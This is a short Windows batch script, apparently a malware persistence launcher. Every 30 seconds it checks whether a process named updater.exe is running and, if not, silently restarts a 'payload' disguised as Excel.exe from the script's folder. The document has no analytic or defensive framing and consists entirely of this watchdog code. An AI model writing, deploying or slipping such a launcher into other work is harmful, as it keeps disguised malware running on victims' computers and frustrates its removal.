@echo off
set payloadPath=%~dp0Excel.exe

:loop
timeout /t 30 /nobreak
tasklist | find /i "updater.exe" >nul || start "" /B "%payloadPath%"
goto loop
